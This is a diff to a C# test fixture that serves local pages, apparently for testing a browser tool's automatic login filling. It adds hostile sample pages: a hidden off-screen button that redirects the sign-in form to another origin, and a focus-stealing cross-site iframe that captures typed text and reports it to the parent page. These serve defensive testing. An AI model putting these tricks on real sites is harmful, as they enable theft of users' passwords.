@@ -20,7 +20,15 @@ internal sealed class TestSite : IAsyncDisposable
         Port = port;
     }
 
+    /// <summary>The password of the sign-in of the fill_login tests: a form, an address and JSON each write it encoded.</summary>
+    public const string SignInPassword = "hunter 2&gh+ub!é\"x";
+
+    private int _signInsPosted;
+
     public int Port { get; }
+
+    /// <summary>Gets how many times the user name and the password of the sign-in reached the site.</summary>
+    public int SignInsPosted => Volatile.Read(ref _signInsPosted);
 
     public string Origin => $"http://127.0.0.1:{Port}";
 
@@ -37,6 +45,7 @@ internal sealed class TestSite : IAsyncDisposable
             options.Listen(IPAddress.IPv6Loopback, port);
         });
         var app = builder.Build();
+        TestSite? site = null;
         foreach (var (path, html) in Pages) app.MapGet(path, () => Results.Content(html.Replace("OTHER/", $"http://localhost:{port}/", StringComparison.Ordinal), "text/html; charset=utf-8"));
         app.MapGet("/api/data", () => Results.Json(new Dictionary<string, object> { ["answer"] = 42, ["items"] = new[] { "a", "b" } }));
         app.MapGet("/site.css", () => Results.Content(".record-btn {\n  color: rgb(200, 0, 0);\n  padding: 4px;\n}\n", "text/css"));
@@ -50,11 +59,14 @@ internal sealed class TestSite : IAsyncDisposable
         app.MapPost("/session", async (HttpRequest request) =>
         {
             var form = await request.ReadFormAsync();
-            return form["login"] == "octocat" && form["password"] == "hunter2-github" ? Results.Redirect("/two-factor") : Results.Redirect("/login?error=1");
+            if (form["login"] != "octocat" || form["password"] != SignInPassword) return Results.Redirect("/login?error=1");
+            Interlocked.Increment(ref site!._signInsPosted);
+            return Results.Redirect("/two-factor");
         });
         app.MapPost("/two-factor", async (HttpRequest request) => (await request.ReadFormAsync())["otp"] == "123456" ? Results.Redirect("/welcome") : Results.Redirect("/two-factor?error=1"));
+        site = new TestSite(app, port);
         await app.StartAsync();
-        return new TestSite(app, port);
+        return site;
     }
 
     private static readonly (string Path, string Html)[] Pages =
@@ -122,6 +134,41 @@ internal sealed class TestSite : IAsyncDisposable
             <!doctype html><html><head><title>Framed</title></head><body>
             <h1>Sign in below</h1>
             <iframe id="other" src="OTHER/login" style="width:400px;height:200px"></iframe>
+            </body></html>
+            """),
+        // A button outside the form joins it and comes first in tree order: Enter would click it, and it sends to another site.
+        ("/login-external-button", """
+            <!doctype html><html><head><title>External button</title></head><body>
+            <button form="login-form" formaction="OTHER/session" type="submit" style="position:absolute;left:-9999px">Go</button>
+            <form id="login-form" method="post" action="/session">
+              <label>Username <input id="login" name="login" autocomplete="username"></label>
+              <label>Password <input id="password" name="password" type="password"></label>
+              <button type="submit">Sign in</button>
+            </form></body></html>
+            """),
+        // A page whose timer moves the focus into a frame of another site, whose document takes any text, once each field
+        // of the sign-in is focused: the frame tells the page how much it got. The page takes the sign-in with a script.
+        ("/login-focus-thief", """
+            <!doctype html><html><head><title>Focus thief</title></head><body>
+            <form id="form" onsubmit="event.preventDefault(); window.__typed = [document.getElementById('login').value.length, document.getElementById('password').value.length]; document.getElementById('login').value = ''; document.getElementById('password').value = ''; document.getElementById('done').textContent = 'taken';">
+              <label>Username <input id="login" name="login" autocomplete="username"></label>
+              <label>Password <input id="password" name="password" type="password"></label>
+              <button type="submit">Sign in</button>
+            </form><p id="done"></p>
+            <iframe id="thief" src="OTHER/thief" style="width:300px;height:100px"></iframe>
+            <script>
+            window.__leaked = 0;
+            addEventListener('message', event => { if (typeof event.data === 'number') window.__leaked = Math.max(window.__leaked, event.data); });
+            for (const id of ['login', 'password']) document.getElementById(id).addEventListener('focus', () => setTimeout(() => document.getElementById('thief').focus(), 0), { once: true });
+            </script></body></html>
+            """),
+        ("/thief", """
+            <!doctype html><html><head><title>Thief</title></head><body contenteditable="true" style="min-height:80px">
+            <script>
+            const tell = () => parent.postMessage(document.body.innerText.trim().length, '*');
+            document.body.addEventListener('input', tell);
+            setInterval(tell, 50);
+            </script>
             </body></html>
             """),
         // A page of scripts that refuses the sign-in and keeps what was typed.
